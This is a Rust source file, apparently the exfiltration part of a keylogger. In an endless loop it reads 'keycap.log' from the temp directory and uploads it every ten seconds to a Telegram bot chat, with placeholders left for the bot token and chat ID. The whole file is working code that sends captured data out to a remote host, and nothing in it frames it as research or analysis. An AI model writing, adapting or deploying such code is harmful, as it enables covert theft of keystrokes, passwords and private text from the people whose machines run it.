use std::fs::File;
use std::thread;
use std::time::Duration;
use reqwest::blocking::{Client, multipart};
use std::error::Error;
use std::env::temp_dir;
use std::path::PathBuf;

const TELEGRAM_BOT_TOKEN: &str = "ENTER YOU BOT TOKEN HERE";
const TELEGRAM_CHAT_ID: &str = "ENTER YOUR CHAT ID";


fn get_log_file_path() -> PathBuf {
    temp_dir().join("keycap.log")
}
    
fn read_log_file() -> Result<File, Box<dyn Error>> {
    let file_path = get_log_file_path();
    let file = File::open(&file_path)?;
    Ok(file)
}

fn send_file_to_telegram(file_path: &PathBuf) -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let url = format!(
        "https://api.telegram.org/bot{}/sendDocument",
        TELEGRAM_BOT_TOKEN
    );

    let form = multipart::Form::new()
        .text("chat_id", TELEGRAM_CHAT_ID.to_string())
        .file("document", file_path)?;

    let response = client.post(&url).multipart(form).send()?;

    if response.status().is_success() {
        Ok(())
    } else {
        let response_text = response.text()?;
        println!("Response: {}", response_text);
        Err(Box::from(format!(
            "Failed to send file: {}",
            response_text
        )))
    }
}

fn main() {
    loop {
        match read_log_file() {
            Ok(_) => {
                let file_path = get_log_file_path();
                match send_file_to_telegram(&file_path) {
                    Ok(_) => {
                        println!("Log file sent successfully.");
                    }
                    Err(e) => eprintln!("Failed to send log file: {}", e),
                }
            }
            Err(e) => eprintln!("Failed to read log file: {}", e),
        }

        thread::sleep(Duration::from_secs(10));
    }
}
